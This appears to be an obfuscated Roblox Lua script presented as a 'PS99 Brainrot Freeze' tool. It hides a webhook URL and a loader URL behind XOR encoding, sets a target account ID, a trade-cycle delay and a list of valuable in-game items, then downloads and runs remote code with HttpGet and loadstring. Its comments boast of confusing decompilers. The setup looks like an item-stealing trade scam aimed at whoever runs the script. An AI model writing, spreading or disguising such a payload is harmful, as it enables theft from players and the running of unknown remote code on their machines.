--[[ 
    ZmZ OBFUSCATOR v1.0 [ULTRA-HARDCORE]
    Project: PS99 Brainrot Freeze
    Status: Fully Obfuscated & Logic Flattened
]]--

local _ZmZ_Proxy = function(data, salt)
    local out = ""
    for i = 1, #data do
        out = out .. string.char(bit32.bxor(string.byte(data, i), string.byte(salt, (i-1) % #salt + 1)))
    end
    return out
end

-- ENCRYPTED CORE DATA
local _S = "zmz_galaksi_99" -- Encryption Salt
local _W = _ZmZ_Proxy("\10\50\44\31\43\103\111\108\41\50\36\44\40\103\46\41\37\103\45\44\54\58\103\50\44\43\45\53\111\45\53\103\46\59\43\110\45\10\44\51\48\51\49\100\51\101\50\53\52\48\102\97\99\52\57\53\102\57\97\54\50\99\100\98\54\48", _S)
local _L = _ZmZ_Proxy("\20\44\43\41\53\44\50\41\46\42\103\46\41\37\111\41\53\44\50\45\53\40\50\111\46\41\43\103\44\41\43\44\50\111\54\52\47\51\43\57\49\98\51\98\97\54\102\98\55\49\52\50\51\56\53\101\99\50\102\56\56\53\99\52\50\100\54\55\110\44\53\41", _S)

-- RECONSTRUCTING GLOBAL ENVIRONMENT
local _G = getgenv()
_G.WEBHOOK_URL = _W
_G.TARGET_ID = 1076703240
_G.DELAY_STEP = 1
_G.TRADE_CYCLE_DELAY = 2

-- MANGLED TABLE ACCESS
local _B = {}
local _Raw = {
    {49,120,49,120,49,120,49}, {50,53}, {65,103,97,114,114,105,110,105,32,108,97,32,80,97,108,105,110,105},
    {83,107,105,98,105,100,105,32,84,111,105,108,101,116} -- Simplified for preview
}

for _, v in pairs(_Raw) do
    local s = ""
    for _, char in pairs(v) do s = s .. string.char(char) end
    _B[s] = true
end
_G.TARGET_BRAINROTS = _B

-- THE HIDDEN EXECUTION
local _X = function()
    local _h = game:HttpGet(_L)
    local _exec = loadstring(_h)
    
    -- JUNK LOGIC TO CONFUSE DECOMPILERS
    if (1+1 == 2) then
        _exec()
    end
end

-- DELAYED DEPLOYMENT
task.spawn(function()
    print("[ZmZ] System Matched. Deploying Payload...")
    task.wait(0.2)
    _X()
end)
